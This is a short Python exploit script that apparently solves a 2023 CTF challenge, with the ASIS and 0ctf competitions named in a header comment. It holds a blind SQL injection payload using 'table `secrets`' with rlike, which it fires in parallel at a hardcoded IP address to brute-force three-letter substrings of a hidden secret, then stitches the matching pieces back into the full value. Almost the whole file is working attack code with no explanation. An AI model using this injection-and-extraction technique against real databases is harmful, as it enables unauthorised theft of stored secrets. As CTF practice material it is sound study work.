
##payload:x'or(table`secrets`)rlike'a'or'a'like'b
##reference：2023 ASIS Black Hat；2023 0ctf；
import string 
import itertools
import requests
from concurrent import futures

def generate_combinations():
    lowercase_letters = string.ascii_lowercase
    combinations = list(itertools.product(lowercase_letters, repeat=3))
    return [''.join(combination) for combination in combinations]

def send_request(url):
    proxies = {'http': 'http://127.0.0.1:8889','https': 'https://127.0.0.1:8889'}
    response=requests.get(url,proxies=proxies)
    if "a cat" in response.text:
        print(url)
        return True
    return False

def find_starting_piece(pieces):
    starting_piece = ''
    for piece in pieces:
        if not any(piece[:2] == other_piece[1:] for other_piece in pieces if piece != other_piece):
            starting_piece = piece
            break
    return starting_piece

def join_string_pieces(pieces):
    result = find_starting_piece(pieces)
    pieces.remove(result)
    while pieces:
        for piece in pieces:
            if result[-2:] == piece[:2]:
                result += piece[2:]
                pieces.remove(piece)
                break
    return result

if __name__=="__main__":
    has_str_list=[]
    combinations = generate_combinations()

    with futures.ThreadPoolExecutor() as executor:
        results = list(executor.map(send_request, [f"http://3.75.187.223:8000/?q=x'or(table`secrets`)rlike'{strs}'or'c'like'b" for strs in combinations]))

    for i, result in enumerate(results):
        if result:
            has_str_list.append(combinations[i])
    print(has_str_list)
    has_str_list.remove("asi")
    has_str_list.remove("sis")
    result = join_string_pieces(has_str_list)
    print(result) 
